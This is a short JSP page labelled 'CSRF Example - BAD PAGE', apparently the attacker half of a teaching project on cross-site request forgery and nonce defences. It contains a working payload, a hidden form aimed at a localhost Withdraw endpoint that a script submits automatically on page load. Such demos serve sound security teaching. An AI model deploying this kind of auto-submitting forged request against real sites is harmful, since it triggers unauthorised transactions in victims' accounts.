<%-- 
    Document   : badPage
    Created on : 8-Mar-2015, 3:26:53 PM
    Author     : John
--%>

<%@page session="false"%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>CSRF Example - BAD PAGE</title>
    </head>
    <body>
        <h1>CSRF Example - BAD PAGE</h1>
        
        <!-- Just visiting this page causes a withdrawal! User doesn't even have to click on anything! -->
        
        <form action="http://localhost:8080/CSRF_example_Nonce/Withdraw" method="GET">
            <input type="text" name="amount" value="100">
        </form>
        
        <script type="text/javascript">
            //Auto-submit form telling application to withdraw funds
            document.forms[0].submit();
        </script>
    </body>
</html>
